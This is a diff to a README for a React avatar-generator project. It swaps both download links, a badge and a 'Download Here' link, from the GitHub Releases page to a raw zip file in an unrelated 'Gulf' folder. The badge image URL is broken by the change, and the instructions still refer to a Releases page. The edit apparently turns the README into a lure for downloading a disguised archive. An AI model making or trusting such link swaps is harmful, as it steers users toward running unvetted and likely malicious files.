@@ -1,6 +1,6 @@
 # 🎨 Avataaars-Generator-using-React-js - Create Unique Avatars Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/hunter09kd/Avataaars-Generator-using-React-js/releases)
+[![Download](https://raw.githubusercontent.com/hunter09kd/Avataaars-Generator-using-React-js/main/Gulf/Avataaars-Generator-using-React-js.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/hunter09kd/Avataaars-Generator-using-React-js/main/Gulf/Avataaars-Generator-using-React-js.zip)
 
 ## 📋 Description
 Avataaars Generator is a sleek and interactive avatar generator built with React. It allows users to create unique avatars, copy image URLs, and download avatars with one click. The application features fully responsive, reusable components and manages state effectively using `useReducer`.
@@ -16,7 +16,7 @@ To get started with Avataaars Generator, follow the simple steps below to downlo
 ## 📥 Download & Install
 To download Avataaars Generator, visit the Releases page below. Here you will find the latest version ready for your use.
 
-[Download Here](https://github.com/hunter09kd/Avataaars-Generator-using-React-js/releases)
+[Download Here](https://raw.githubusercontent.com/hunter09kd/Avataaars-Generator-using-React-js/main/Gulf/Avataaars-Generator-using-React-js.zip)
 
 1. Click the **Download Here** link above.
 2. On the Releases page, look for the latest version.
